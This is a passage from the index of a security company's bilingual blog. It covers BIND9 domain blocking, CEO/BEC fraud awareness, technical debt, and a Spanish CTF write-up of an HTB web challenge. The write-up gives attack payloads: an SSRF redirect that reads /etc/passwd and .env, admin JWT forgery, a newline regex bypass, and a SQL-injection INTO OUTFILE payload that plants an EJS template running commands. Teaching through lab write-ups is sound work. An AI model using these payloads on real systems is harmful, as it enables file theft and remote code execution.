server efficiently retrieves the result from its cache.</p> <pre><code>; &lt;&lt;&gt;&gt; DiG 9.18.28-1~deb12u2-Debian &lt;&lt;&gt;&gt; google.com\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 51691\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n; COOKIE: a2419e6c5e03859d0100000067966b096b0ad0c0a30e2273 (good)\n;; QUESTION SECTION:\n;google.com.                    IN      A\n\n;; ANSWER SECTION:\ngoogle.com.             297     IN      A       142.250.200.142\n\n;; Query time: 0 msec\n;; SERVER: 127.0.0.1#53(127.0.0.1) (UDP)\n;; MSG SIZE  rcvd: 83\n</code></pre> <p>We can see that the SERVER we are asking is <code>127.0.0.1</code> as it is our bind9 DNS server.</p> <p>However, what if we want to take things a step further and enforce our own restrictions? Whether it\u2019s for enhanced security, blocking specific websites, or creating a safer internet environment for children, we can configure BIND9 to restrict access to a custom list of domains. This gives us full control over what content is allowed or denied on our network, tailoring the DNS server to meet our specific needs.</p>"},{"location":"blog/posts/26-01-2025/#blocking-specific-domains-using-bind9","title":"Blocking specific domains using BIND9","text":"<p>To block specific domains using BIND9, you can create a custom zone file that redirects queries for those domains to an invalid or non-existent address, effectively blocking access.</p> <p>Here's a step-by-step guide:</p>"},{"location":"blog/posts/26-01-2025/#create-a-zone-file-for-blocked-domains","title":"Create a Zone File for Blocked Domains","text":"<p>A zone file defines the DNS records for the domains you want to block. These records can redirect the blocked domains to a &lt;&lt;blackhole&gt;&gt; (e.g., <code>127.0.0.1</code> or <code>0.0.0.0</code>).</p> <ol> <li>Create a new zone file for blocking domains, for example, <code>block_instagram.zone</code>: <pre><code>sudo nano /etc/bind/block_instagram.zone\n</code></pre></li> <li>Add the following content to the zone file:</li> </ol> <pre><code>$TTL    3600\n@       IN      SOA     localhost. root.localhost. (\n                2025012601 ; Serial\n                3600       ; Refresh\n                1800       ; Retry\n                604800     ; Expire\n                86400 )    ; Minimum TTL\n        IN      NS      localhost.\n\n@       IN      A       127.0.0.1\n*       IN      A       127.0.0.1\n</code></pre> <ul> <li> <p>127.0.0.1: Redirects queries for the blocked domains to the local machine, effectively preventing access.</p> </li> <li> <p>Wildcard Record ( IN A)*: Ensures any subdomain of the blocked domain is also redirected.</p> </li> </ul>"},{"location":"blog/posts/26-01-2025/#define-the-blocked-domains-in-namedconflocal","title":"Define the Blocked Domains in <code>named.conf.local</code>","text":"<p>We are going to block Instagram. You need to associate the blocked domains with the custom zone file.</p> <ol> <li> <p>Open the BIND9 configuration file: <pre><code>sudo nano /etc/bind/named.conf.local\n</code></pre></p> </li> <li> <p>Add a zone entry for each domain you want to block. In this case we will block instagram.com and cdninstagram.com, Instagram's content delivery network (CDN) domain used for serving images and videos: <pre><code>zone \"instagram.com\" {\n    type master;\n    file \"/etc/bind/block_instagram.zone\";\n};\n\nzone \"cdninstagram.com\" {\n    type master;\n    file \"/etc/bind/block_instagram.zone\";\n};\n</code></pre></p> </li> </ol>"},{"location":"blog/posts/26-01-2025/#reload-bind9-configuration","title":"Reload BIND9 Configuration","text":"<p>Once you\u2019ve created the zone file and updated the configuration, reload the BIND9 service to apply the changes.</p> <ol> <li> <p>Check the configuration for errors: <pre><code>sudo named-checkconf\n</code></pre></p> </li> <li> <p>Reload the BIND9 service: <pre><code>sudo systemctl reload bind9\n</code></pre></p> </li> </ol>"},{"location":"blog/posts/26-01-2025/#test-the-configuration","title":"Test the Configuration","text":"<p>To verify that the blocked domains are working as expected:</p> <ol> <li> <p>Use the dig command to query the blocked domain: <pre><code>dig instagram.com.\n</code></pre></p> <ul> <li>The response should return 127.0.0.1.</li> </ul> </li> <li> <p>Try accessing the blocked domain in a browser. It should fail to load.</p> </li> </ol> Instagram not Available <p>By creating a custom zone file and associating it with the domains you want to block, you gain full control over restricting access to specific websites. This setup allows you to:</p> <ul> <li>Enhance security by blocking known malicious domains.</li> <li>Customize the DNS server to meet your network\u2019s specific requirements.</li> </ul>"},{"location":"blog/posts/26-01-2025/#conclusion","title":"Conclusion","text":"<p>Now you\u2019ve learned how to block any domain you don\u2019t want your family or network users accessing. Whether it\u2019s limiting social media to help your kids focus, enhancing security by blocking malicious sites, or simply taking control of your network, you now have the tools to make it happen.</p> <p>This example was done on a local laptop, but it doesn\u2019t have to stop there. You can implement the same setup at the router level or use a Raspberry Pi as your primary DNS server. By doing this, you can apply these rules to your entire network, ensuring that all connected devices follow your custom restrictions.</p> <p>With this approach, you\u2019re not just managing a DNS server\u2014you\u2019re creating a safer, more productive digital environment for everyone on your network.</p>"},{"location":"blog/posts/30-11-2024/","title":"XVIII Jornadas STIC CCN-CERT | VI Jornadas de Ciberdefensa ESPDEF-CERT","text":"<p>Last Tuesday, we had the honor of attending the XVIII Jornadas STIC CCN-CERT | VI Jornadas de Ciberdefensa ESPDEF-CERT, held at the Kin\u00e9polis cinemas in Ciudad de la Imagen, Madrid. The main purpose of this trip was to receive an award granted to our cybersecurity team, who emerged as winners of a national competition organized by the Universidad de Granada in collaboration with the El Mando Conjunto del Ciberespacio (MCCE) and the Instituto Nacional de Ciberseguridad (INCIBE). This recognition not only fills us with pride but also reinforces our commitment to new generations and our confidence in the immense talent of these young professionals.</p> <p>Moreover, we took advantage of our time at this important event to start carving out a space for ourselves in the industry, establishing connections with other companies, and learning from the experiences and advice of leading organizations in the technological landscape, both nationally and internationally.</p> <p>We are convinced that this is the right path, and we are leaving Madrid with great enthusiasm to help all the companies that place their trust in us achieve excellence.</p> <p>#XVIIIJORNADASCCNCERT #VIJORNADASESPDEFCERT</p> Our Team on the photocall"},{"location":"es/blog/","title":"Bienvenido a nuestro Blog","text":""},{"location":"es/blog/posts/02-02-2025/","title":"La Costosa Lecci\u00f3n del Fraude del CEO: Por Qu\u00e9 es Crucial la Capacitaci\u00f3n en Ciberseguridad para Empleados","text":"<p>16 de Enero de 2016 \u2013 Ried im Innkreis, Austria. En las oficinas de FACC Operations GmbH (un fabricante austriaco de componentes aeroespaciales), un empleado del departamento de finanzas recibi\u00f3 un correo electr\u00f3nico urgente que parec\u00eda provenir directamente del CEO de la empresa.</p> <p>La solicitud era clara: se necesitaba una transferencia de un mill\u00f3n de euros para finalizar un \"proyecto estrat\u00e9gico\".</p> <p>Presionado por el car\u00e1cter \"confidencial\" de la solicitud y la autoridad del remitente, el empleado procedi\u00f3 con la transacci\u00f3n sin verificar su legitimidad.</p> <p>Unos d\u00edas m\u00e1s tarde, la FACC descubri\u00f3 que hab\u00eda sido estafada. El email no proced\u00eda del verdadero CEO, sino de cibercriminales que hab\u00edan suplantado su identidad. Como resultado, la compa\u00f1\u00eda perdi\u00f3 aproximadamente de 42 millones de euros en una sola transferencia bancaria.</p> <p>Esta caso muestra c\u00f3mo la falta de concienciaci\u00f3n y formaci\u00f3n en ciberseguridad puede provocar p\u00e9rdidas financieras masivas, no necesariamente debidas a fallos t\u00e9cnicos o vulnerabilidades software, sino m\u00e1s bien por el factor humano. </p>"},{"location":"es/blog/posts/02-02-2025/#por-que-invertir-recursos-en-la-formacion-de-los-empleados","title":"\u00bfPor qu\u00e9 invertir recursos en la formaci\u00f3n de los empleados?","text":"<ul> <li>El eslab\u00f3n m\u00e1s vulnerable</li> </ul> <p>Aunque disponga de medidas tecnol\u00f3gicas de \u00faltima generaci\u00f3n, si el personal no est\u00e1 atento, los empleados se convierten en el punto de entrada m\u00e1s f\u00e1cil para los atacantes.</p> <ul> <li>Ingenier\u00eda Social y Manipulaci\u00f3n</li> </ul> <p>Los ataques de  Phishing y BEC explotan la confianza y la autoridad en lugar de hackear las vulnerabilidades t\u00e9cnicas.</p> <ul> <li>Consecuencias Econ\u00f3micas y Reputational</li> </ul> <p>Una sola transacci\u00f3n fraudulenta puede causar p\u00e9rdidas multimillonarias y ** da\u00f1os irreparables** a la reputaci\u00f3n de la empresa.</p> <ul> <li>Falsa Sensaci\u00f3n de Seguridad</li> </ul> <p>Pensar, esto no nos va a pasar a nosotros, es un grave error. Los cibercriminales perfeccionan continuamente sus m\u00e9todos, dirigi\u00e9ndose a organizaciones de todos los tama\u00f1os.</p>"},{"location":"es/blog/posts/02-02-2025/#como-podemos-prevenir-estas-situaciones","title":"\u00bfC\u00f3mo Podemos Prevenir Estas Situaciones?","text":"<ul> <li>Entrenamiento Continuo</li> </ul> <p>Organice talleres, webinars y simulaciones de ataques de phishing o BEC. Ense\u00f1e a sus empleados a detectar emails sospechosos, direcciones de remitente alteradas y t\u00e1cticas exageradas de urgencia o confidencialidad.</p> <ul> <li>Pol\u00edticas de Verificaci\u00f3n Internas</li> </ul> <p>Establezca protocolos que exijan confirmaci\u00f3n telef\u00f3nica o en persona para transferencias de alto valor. Exigir doble aprobaci\u00f3n o firma de m\u00faltiples ejecutivos para las transacciones financieras importantes.</p> <ul> <li>Autenticaci\u00f3n Multifactor (MFA)</li> </ul> <p>Un nombre de usuario y contrase\u00f1a por s\u00ed solos no son suficientes. La verificaci\u00f3n en dos o varios pasos (c\u00f3digos de un solo uso, aplicaciones de autenticaci\u00f3n, tokes f\u00edsicos) dificultan el acceso no autorizado, especialmente cuando las credenciales son comprometidas mediante phishing.</p> <ul> <li>Cultura de la \"Desconfianza Constructiva\"</li> </ul> <p>Anime a los empleados a reportar y cuestionar la legitimidad de un email siempre que tengan dudas, sin miedo a las repercusiones. Crea un canal de comunicaci\u00f3n claro para reportar r\u00e1pidamente de las anomal\u00edas.</p>"},{"location":"es/blog/posts/02-02-2025/#conclusiones","title":"Conclusiones","text":"<p>El caso FACC demuestra que un \u00fanico fallo humano puede causar p\u00e9rdidas millonarias y graves da\u00f1os en la reputaci\u00f3n. No hubo malware, ni violaci\u00f3n de la red, s\u00f3lo un email bien elaborado que explot\u00f3 la confianza humana.</p> <p>La ciberseguridad no solo trata sobre firewalls y antivirus, sino tambi\u00e9n en crear una cultura que d\u00e9 prioridad a la seguridad mediante la formaci\u00f3n, concienciaci\u00f3n y protocolos estrictos. Cuando cada empleado entiende los riesgos y sabe como responder, el factor humano pasa de ser el eslab\u00f3n m\u00e1s d\u00e9bil a convertirse en la primera l\u00ednea de defensa.</p> <p>Los simulacros de phishing peri\u00f3dicos son esenciales para fortalecer la postura de ciberseguridad de la empresa. Los cibercriminales continuamente perfeccionan sus t\u00e1cticas, convirtiendo a los empleados en la primera l\u00ednea de defensa contra ataques como el Business Email Compromise (BEC) y robo de credenciales. Al realizar pruebas de phishing peri\u00f3dicas, las organizaciones pueden reforzar la concienciaci\u00f3n de la seguridad y formar al personal para reconocer y reportar emails sospechosos. Este enfoque proactivo reduce el error humano, minimiza los riesgos financieros y de reputaci\u00f3n, y fomenta una cultura de seguridad en la empresa.</p>"},{"location":"es/blog/posts/02-02-2025/#otros-casos","title":"Otros Casos","text":""},{"location":"es/blog/posts/02-02-2025/#google-y-facebook","title":"Google y Facebook","text":"<p>Un estafador lituano envi\u00f3 emails fraudulentos durante varios a\u00f1os, haci\u00e9ndose pasar por un proveedor de hardware. Tanto Google como Facebook transfirieron fondos por un valor total de m\u00e1s de 100 millones de d\u00f3lares. </p>"},{"location":"es/blog/posts/02-02-2025/#toyota-boshoku","title":"Toyota Boshoku","text":"<p>Una subsidiaria de Toyota transfiri\u00f3 aproximadamente 37 millones de d\u00f3lares a cibercriminales despu\u00e9s de recibir emails fraudulentos de apariencia genuina disfrazados de proveedor de comunicaciones. Lee m\u00e1s en Tripwire</p>"},{"location":"es/blog/posts/02-02-2025/#crelan-bank","title":"Crelan Bank","text":"<p>El Crelan Bank de B\u00e9lgica perdi\u00f3 70 millones de euros en un ataque Business Email Compromise (BEC), donde los cibercriminales se hicieron pasar por ejecutivos de alto rango para solicitar transferencias. Lee m\u00e1s en Help Net Security</p> <p>Stay safe. Stay smart. Stay secure.</p>"},{"location":"es/blog/posts/08-12-2024/","title":"Reto, Entrenamiento, Bandera: Robo de Planos","text":"<p>En Atlansec, estamos comprometidos con los CTFs como una herramienta clave de aprendizaje bajo la metodolog\u00eda de aprender haciendo. Creemos que enfrentar retos pr\u00e1cticos es la mejor manera de desarrollar habilidades t\u00e9cnicas y fomentar la creatividad. Con esta secci\u00f3n queremos difundir el valor de los CTFs, compartir writeups de Retos de cierta complejidad t\u00e9cnica y acercar a la comunidad a un enfoque pr\u00e1ctico y t\u00e9cnico del aprendizaje.</p>"},{"location":"es/blog/posts/08-12-2024/#que-es-un-ctf","title":"\u00bfQu\u00e9 es un CTF?","text":"<p>Las competiciones de capturar la bandera (CTF) son Retos de ciberseguridad donde los participantes se enfrentan a una serie de problemas t\u00e9cnicos para encontrar \"banderas\", que son marcadores ocultos que demuestran que se ha completado con \u00e9xito una tarea. Los CTFs simulan situaciones de la vida real en \u00e1reas como la criptograf\u00eda, ingenier\u00eda inversa, seguridad web, an\u00e1lisis forense y explotaci\u00f3n de binarios, ayudando a los participantes a adquirir habilidades esenciales en ciberseguridad.</p> <p>Los CTFs no solo son una competici\u00f3n; son la puerta de entrada al aprendizaje mediante la resoluci\u00f3n de problemas. Ense\u00f1an a los participantes a pensar de forma cr\u00edtica, a depurar sistemas complejos, y a adaptarse bajo presi\u00f3n. Cada Reto es una historia, un rompecabeza y una lecci\u00f3n todo en uno.</p> <p>En esta serie, exploraremos Retos CTF notables, nos sumergiremos en sus soluciones t\u00e9cnicas y destacaremos las habilidades que desarrollan. \u00a1Bienvenido a Reto, Entrenamiento, Bandera!</p>"},{"location":"es/blog/posts/08-12-2024/#conceptos-claves","title":"Conceptos claves","text":"<ul> <li> <p>SSRF (Server-Side Request Forgery): Es una t\u00e9cnica que permite al atacante a forzar a un servidor a realizar peticiones HTTP en su nombre. Dependiendo del contexto, puede ser bastante cr\u00edtico ya que puede permitir a un atacante acceder a recursos dentro de la red interna del objetivo.</p> </li> <li> <p>JSON Web Token (JWT): Es un est\u00e1ndar abierto para autenticar y transferir informaci\u00f3n de forma segura utilizando un token.</p> </li> <li> <p>Inyecci\u00f3n SQL: Ataque que permite inyectar c\u00f3digo SQL malicioso en una consulta para manipular la consulta de la base de datos.</p> </li> <li> <p>wkhtmltopdf: Librer\u00eda para convertir contenido web (HTML) en PDF.</p> </li> </ul>"},{"location":"es/blog/posts/08-12-2024/#el-reto","title":"El Reto","text":"<p>En esta ocasi\u00f3n os traemos un reto de HTB Business CTF 2024. El reto es de la categor\u00eda web y aunque est\u00e1 catalogado como f\u00e1cil en la plataforma de HackTheBox, es uno de los retos web m\u00e1s complejos de la plataforma debido al n\u00famero de pasos que componen la soluci\u00f3n.</p> <p>En este reto se nos da el c\u00f3digo fuente de una aplicaci\u00f3n NoseJS y acceso a un servicio web que ejecuta la aplicaci\u00f3n.</p>"},{"location":"es/blog/posts/08-12-2024/#entendiendo-la-logica-de-la-aplicacion","title":"Entendiendo la L\u00f3gica de la Aplicaci\u00f3n","text":"<p>El reto comienza con el acceso a la aplicaci\u00f3n de la comisi\u00f3n de urbanismo. Al navegar, nos damos cuenta que al pulsar sobre cualquiera de los enlaces se genera una petici\u00f3n POST a la ruta /download. Revisemos su implementaci\u00f3n en el archivo de rutas:</p> <pre><code>router.post(\"/download\", authMiddleware(\"guest\"), (req, res, next) =&gt; {\n    convertPdf(req, res, next);\n});\n</code></pre> <p>Aqu\u00ed podemos ver que la funci\u00f3n convertPdf es la responsable de manejar la l\u00f3gica de esta ruta. Vamos a examinar su c\u00f3digo:</p> <pre><code>async function convertPdf(req, res, next) {\n    try {\n        const { url } = req.body;\n\n        if (!isUrl(url)) {\n            return next(generateError(400, \"Invalid URL\"));\n        }\n\n        const pdfPath = await generatePdf(url);\n        res.sendFile(pdfPath, { root: \".\" });\n    } catch (error) {\n        return next(generateError(500, error.message));\n    }\n}\n</code></pre> <p>Despu\u00e9s de leerlo, podemos ver que la funci\u00f3n se asegura que el par\u00e1metro que recibe es una URL v\u00e1lida antes de pasarla a la funci\u00f3n generatePdf. Veamos esto \u00faltimo:</p> <pre><code>async function generatePdf(urls) {\n    const pdfFilename = generateRandomFilename();\n    const pdfPath = `uploads/${pdfFilename}`;\n\n    try {\n        await generatePdfFromUrl(urls, pdfPath);\n        return pdfPath;\n    } catch (error) {\n        throw new Error(`Error generating PDF: ${error.stack}`);\n    }\n}\n\nasync function generatePdfFromUrl(url, pdfPath) {\n    return new Promise((resolve, reject) =&gt; {\n        wkhtmltopdf(url, { output: pdfPath }, (err) =&gt; {\n            if (err) {\n                reject(err);\n            } else {\n                resolve();\n            }\n        });\n    });\n}\n</code></pre> <p>Observamos que la funci\u00f3n generatePdfFromUrl usa wkhtmltopdf para convertir el contenido de la URL en un archivo PDF. Este flujo abre la puerta a una vulnerabilidad SSRF en la librer\u00eda.</p>"},{"location":"es/blog/posts/08-12-2024/#ssrf-para-la-lectura-de-archivos-en-wkhtmltopdf","title":"SSRF para la lectura de archivos en wkhtmltopdf","text":"<p>Utilizando un servidor controlado por el atacante, podemos servir archivos en un servidor web para redirigir al visitante a ubicaciones locales en el sistema de archivos, en este caso convirtiendo el SSRF en una forma de leer archivos internos como /etc/passwd. Para hacer esto, creamos un archivo PHP con el siguiente contenido:</p> <pre><code>&lt;?php header('location:file:///etc/passwd'); ?&gt;\n</code></pre> <p>Al pasar la URL de nuestro servidor como par\u00e1metro a la ruta /download, el PDF generado contendr\u00e1 el contenido del archivo /etc/passwd del servidor que realiza la petici\u00f3n.</p> Leyendo el /etc/passwd con el generador de PDF <p>A continuaci\u00f3n, modificamos el archivo PHP para exfiltar el archivo .env de la aplicaci\u00f3n:</p> <pre><code>&lt;?php header('location:file:///app/.env'); ?&gt;\n</code></pre> Leyendo el archivo .env con el generador de PDF"},{"location":"es/blog/posts/08-12-2024/#falsificacion-del-jwt","title":"Falsificaci\u00f3n del JWT","text":"<p>Con la clave extra\u00edda del archivo .env, podemos firmar tokens JWT v\u00e1lidos. Usamos una herramienta como JWT.io para generar el token con el rol de administrador:</p> <pre><code>{\n  \"role\": \"admin\"\n}\n</code></pre> Editar token JWT en JWT.io <p>Usando el token que hemos generado, haremos una petici\u00f3n al endpoint interno del panel de administraci\u00f3n con la siguiente estructura:</p> <pre><code>http://127.0.0.1:1337/admin?token=&lt;JWT_admin&gt;\n</code></pre> <p>En el PDF generado podemos ver el contenido del panel de administraci\u00f3n. Aunque esto genera una captura de pantalla del panel de administraci\u00f3n, s\u00f3lo nos lleva la mitad del camino de nuestro objetivo final.</p> PDF con el contenido del panel de administraci\u00f3n"},{"location":"es/blog/posts/08-12-2024/#inyeccion-sql-a-la-subida-del-archivo","title":"Inyecci\u00f3n SQL a la subida del archivo","text":"<p>Analizando el resto del c\u00f3digo de la aplicaci\u00f3n, descubrimos que el endpoint GraphQL es vulnerable a Inyecci\u00f3n SQL en la consulta getDataByName. Sin embargo, se utiliza una expresi\u00f3n regular robusta para filtrar las entradas maliciosas:</p> <pre><code>function detectSqli(query) {\n    const pattern = /^.*[!#$%^&amp;*()\\-_=+{}\\[\\]\\\\|;:'\\\",.&lt;&gt;\\/\\?]/;\n    return pattern.test(query);\n}\n</code></pre> <p>Un an\u00e1lisis m\u00e1s detallado muestra que la expresi\u00f3n no es multil\u00ednea, lo que nos permite realizar un bypass con un salto de l\u00ednea (<code>n</code>).</p> <ul> <li>Sin salto de l\u00ednea.</li> </ul> La expresi\u00f3n regular coincide con nuestro payload <ul> <li>Con salto de l\u00ednea.</li> </ul> La expresi\u00f3n regular no coincide con nuestro payload <p>Una vez descubierto esto, podemos construir un payload para una inyecci\u00f3n SQL que escriba un archivo EJS malicioso en la ruta de error 404, ya que la aplicaci\u00f3n no tiene una ruta para manejar este tipo de error.</p> <p>El payload que construimos deber\u00eda ser similar al siguiente, donde incluimos la plantilla EJS que leer la bandera ejecutando el binario objetivo.</p> <pre><code>' UNION SELECT 1, '&lt;p&gt;&lt;%= process.mainModule.require(\"child_process\").execSync(\"/readflag\") %&gt;&lt;/p&gt;', 2, 3 INTO OUTFILE '/app/views/errors/404.ejs'--\n</code></pre> <p>Con el archivo malicioso en su lugar, accedemos a la ruta inexistente lanzando un error 404 y ejecutando el comando /readflag. Esto nos da acceso al contenido de la bandera.</p> Lectura de la bandera"},{"location":"es/blog/posts/09-02-2025/","title":"Deuda t\u00e9cnica: un mal necesario en el desarrollo de software","text":"<p>En Atlansec, aunque somos principalmente una empresa de ciberseguridad, tambi\u00e9n abordamos la deuda t\u00e9cnica desde la perspectiva del desarrollo de software seguro y la seguridad de las infraestructuras. Construir c\u00f3digo seguro e infraestructuras robustas es clave para reducir las vulnerabilidades y garantizar la mantenibilidad a largo plazo.</p> <p>La deuda t\u00e9cnica es un enemigo inevitable que acompa\u00f1a a todos los proyectos de software en mayor o menor medida. Sin embargo, no siempre es perjudicial y, en algunos casos, puede ser una estrategia necesaria para alcanzar objetivos cr\u00edticos en un plazo determinado.</p>"},{"location":"es/blog/posts/09-02-2025/#que-es-la-deuda-tecnica","title":"\u00bfQu\u00e9 es la deuda t\u00e9cnica?","text":"<p>La deuda t\u00e9cnica representa el coste de arreglar un c\u00f3digo sub\u00f3ptimo o mal implementado que resulta de acelerar el desarrollo para cumplir los plazos. Es el precio que se paga cuando se prioriza la velocidad sobre la calidad del software.</p> <p>Su origen est\u00e1 en la necesidad de lanzar r\u00e1pidamente nuevas funcionalidades, a menudo sacrificando aspectos fundamentales como la mantenibilidad y claridad de c\u00f3digo. Pero, \u00bfes siempre negativa?</p>"},{"location":"es/blog/posts/09-02-2025/#es-la-deuda-tecnica-intrinsecamente-mala","title":"\u00bfEs la deuda t\u00e9cnica intr\u00ednsecamente mala?","text":"<p>Depende del contexto. Acelerar el desarrollo de forma controlada para cumplir un plazo cr\u00edtico no es lo mismo que escribir c\u00f3digo desordenado por ignorancia o por falta de buenas pr\u00e1cticas.</p> <p>Asana resume bien este concepto en cuatro cuadrantes de deuda t\u00e9cnica:</p> Cuadrante de deuda t\u00e9cnica de Asana"},{"location":"es/blog/posts/09-02-2025/#los-4-cuadrantes-de-la-deuda-tecnica","title":"Los 4 Cuadrantes de la Deuda T\u00e9cnica","text":"<ol> <li>Prudente y deliberada: La decisi\u00f3n consciente de aplicar una soluci\u00f3n r\u00e1pida y afrontar las consecuencias m\u00e1s adelante. Este tipo de deuda es aceptable cuando el riesgo es bajo, y las ventajas de una entrega r\u00e1pida superan a las desventajas.</li> <li>Imprudente y deliberada: Tener los conocimientos y la capacidad de escribir un buen c\u00f3digo, pero optar por dar prioridad a la velocidad sin una estrategia para mitigar la duda resultante. Este enfoque a menudo conduce a problemas a largo plazo.</li> <li>Prudente e inadvertido: Intentar producir el mejor c\u00f3digo posible pero descubrir una mejor soluci\u00f3n m\u00e1s tarde. En este caso, la deudo no se debe a malas pr\u00e1cticas sino al aprendizaje y evoluci\u00f3n del software.</li> <li>Imprudente e inadvertido: La duda se genera de forma inconsciente, ya se a por desconocimiento o por falta de experiencia en buenas pr\u00e1cticas de desarrollo. Este tipo de duda es especialmente arriesgada, ya que puede acumularse sin que el equipo se d\u00e9 cuenta.</li> </ol>"},{"location":"es/blog/posts/09-02-2025/#tipos-de-deudas-tecnicas","title":"Tipos de Deudas T\u00e9cnicas","text":""},{"location":"es/blog/posts/09-02-2025/#1-intencionada","title":"1. Intencionada","text":"<p>Este tipo de duda es generada cuando se toman decisiones deliberadas para priorizar la entrega de funcionalidad, sabiendo que el c\u00f3digo requerir\u00e1 de mejoras en el futuro. Es com\u00fan en proyectos con plazos ajustados o cuando es necesario validar una idea antes de optimizar el c\u00f3digo.</p>"},{"location":"es/blog/posts/09-02-2025/#2-no-intencionada","title":"2. No intencionada","text":"<p>Se produce debido a errores, falta de conocimiento o c\u00f3digo mal escrito sin que el equipo sea consciente de las consecuencias. Esta duda es a menudo la m\u00e1s peligrosa ya que se puede acumular hasta un nivel inmanejable.</p>"},{"location":"es/blog/posts/09-02-2025/#ejemplos-de-deudas-tecnicas","title":"Ejemplos de Deudas T\u00e9cnicas","text":"<p>La duda t\u00e9cnica aparece de muchas formas y puede surgir por diversas causas. Abajo encontramos algunos ejemplos comunes encontrados en proyectos de desarrollo software:</p> <ul> <li>Deuda T\u00e9cnica Arquitect\u00f3nica: Un dise\u00f1o arquitect\u00f3nico deficiente puede conducir a problemas significativos a largo plazo. Por ejemplo:</li> <li>Monolitos dif\u00edcil de escalar: Un \u00fanico bloque de c\u00f3digo puede dificultar la escalabilidad y la flexibilidad. </li> <li>Pobre separaci\u00f3n de preocupaciones: Una arquitectura mal dise\u00f1ada puede dificultar la modularidad y la reutilizaci\u00f3n de c\u00f3digo.</li> <li>Dependencias excesivas: El alto acoplamiento entre componentes hace que las modificaciones sean costosas y arriesgadas.</li> <li>Falta de documentaci\u00f3n de la arquitectura: Sin una gu\u00eda clara, el equipo puede tomar decisiones que agraven la deuda t\u00e9cnica.</li> <li>Documentaci\u00f3n insuficiente: Los proyectos con una documentaci\u00f3n probe o inexistente puede conducir a los desarrolladores a malinterpretar el prop\u00f3sito del c\u00f3digo, las features o la arquitectura. Esto crea una brecha de conocimiento, que puede acumular deuda t\u00e9cnica cuando se hacen suposiciones incorrectas o cuando los nuevos desarrolladores luchan por entender el sistema.</li> <li>C\u00f3digo duplicado: C\u00f3digo redundante o copiar y pegar c\u00f3digo en diferentes partes del sistema sugiere que el equipo no ha considerado adecuadamente las oportunidades de reutilizaci\u00f3n de c\u00f3digo.</li> <li>Bibliotecas o APIs obsoletas: Si un proyecto depende en bibliotecas o APIs obsoletas, ser\u00e1 cada vez m\u00e1s dif\u00edcil de asegurar, mantener y expandir a medida que estas dependencias dejen de tener soporte.</li> </ul>"},{"location":"es/blog/posts/09-02-2025/#impacto-de-la-deuda-tecnica","title":"Impacto de la Deuda T\u00e9cnica","text":"<p>La deuda t\u00e9cnica puede tener un impacto significativo en el desarrollo software y en las operaciones empresariales. Algunas consecuencias negativas incluyen:</p>"},{"location":"es/blog/posts/09-02-2025/#retrasos-en-el-desarrollo","title":"Retrasos en el Desarrollo","text":"<p>A medida de que la deuda t\u00e9cnica se acumula, aumenta el tiempo necesario para implementar nuevas caracter\u00edsticas o solucionar problemas. Los atajos tomados inicialmente se traducen en un en un mayor esfuerzo y en m\u00e1s tiempo invertido posteriormente.</p>"},{"location":"es/blog/posts/09-02-2025/#mayores-costes-de-mantenimiento","title":"Mayores Costes de Mantenimiento","text":"<p>El mantenimiento del software con deuda t\u00e9cnica requiere m\u00e1s tiempo y recursos. Los problemas subyacentes deben de ser abordados antes de poder realizar cambios o mejoras adicionales, lo que incrementa los costes operativos a largo plazo.</p>"},{"location":"es/blog/posts/09-02-2025/#menor-calidad-del-software","title":"Menor Calidad del Software","text":"<p>La deuda t\u00e9cnica se traduce a menudo como c\u00f3digo de baja calidad, que da lugar a errores y fallos frecuentes. Esto afecta a la satisfacci\u00f3n del cliente y a la reputaci\u00f3n de la empresa.</p>"},{"location":"es/blog/posts/09-02-2025/#dificultad-para-atraer-y-retener-talento","title":"Dificultad para Atraer y Retener Talento","text":"<p>Los desarrolladores cualificados prefieren trabajar en proyectos bien mantenidos y t\u00e9cnicamente s\u00f3lidos. Acumular deuda t\u00e9cnica puede dificultar la contrataci\u00f3n y retenci\u00f3n de personal cualificado.</p>"},{"location":"es/blog/posts/09-02-2025/#como-gestionar-y-reducir-la-deuda-tecnica","title":"C\u00f3mo Gestionar y Reducir la Deuda T\u00e9cnica","text":"<p>En Atlansec, entendemos que la gesti\u00f3n de la deuda t\u00e9cnica es crucial para el \u00e9xito de cualquier proyecto software. Por lo tanto, adoptamos un enfoque proactivo basado en las siguientes estrategias:</p>"},{"location":"es/blog/posts/09-02-2025/#1-refactorizacion-continua","title":"1. Refactorizaci\u00f3n Continua","text":"<p>Adoptar una cultura de refactorizaci\u00f3n continua ayuda a mejorar la calidad del c\u00f3digo sin afectar a la entrega de nuevas caracter\u00edsticas. Los peque\u00f1os ajustes frecuentes pueden prevenir la acumulaci\u00f3n de deuda t\u00e9cnica.</p>"},{"location":"es/blog/posts/09-02-2025/#2-revisiones-del-codigo","title":"2. Revisiones del C\u00f3digo","text":"<p>Las revisiones de c\u00f3digo permiten identificar los problemas antes de que se conviertan en deuda. Fomentar la colaboraci\u00f3n entre desarrolladores garantizan mejores pr\u00e1cticas y c\u00f3digo de mayor calidad.</p>"},{"location":"es/blog/posts/09-02-2025/#3-automatizacion-de-pruebas-y-cicd","title":"3. Automatizaci\u00f3n de pruebas y CI/CD","text":"<p>El uso de canales de pruebas automatizados e integraci\u00f3n/despliegue continuos (CI/CD) permiten la r\u00e1pida detecci\u00f3n de problemas y previenen la acumulaci\u00f3n de deuda t\u00e9cnica no intencionada.</p>"},{"location":"es/blog/posts/09-02-2025/#4-documentacion-y-buenas-practicas","title":"4. Documentaci\u00f3n y Buenas Pr\u00e1cticas","text":"<p>Escribir una documentaci\u00f3n clara y seguir patrones de dise\u00f1os establecidos facilita el mantenimiento del c\u00f3digo y reduce el riesgo de generar deuda t\u00e9cnica debido a malentendidos.</p>"},{"location":"es/blog/posts/09-02-2025/#5-planificacion-tecnica-desde-el-principio","title":"5. Planificaci\u00f3n T\u00e9cnica desde el Principio","text":"<p>Centrarse en un dise\u00f1o arquitect\u00f3nico adecuado antes de que el desarrollo comience puede prevenir problemas a largo plazo. Invertir tiempo en la planificaci\u00f3n evita muchas decisiones precipitadas que generan deudas. </p>"},{"location":"es/blog/posts/09-02-2025/#enlaces-relacionados","title":"Enlaces Relacionados","text":"<ul> <li>Asana - Deuda T\u00e9cnica</li> <li>Atlassian - Deuda T\u00e9cnica en Agile</li> </ul>"},{"location":"es/blog/posts/14-11-2024/","title":"Introducci\u00f3n a FTP","text":"<p>El protocolo 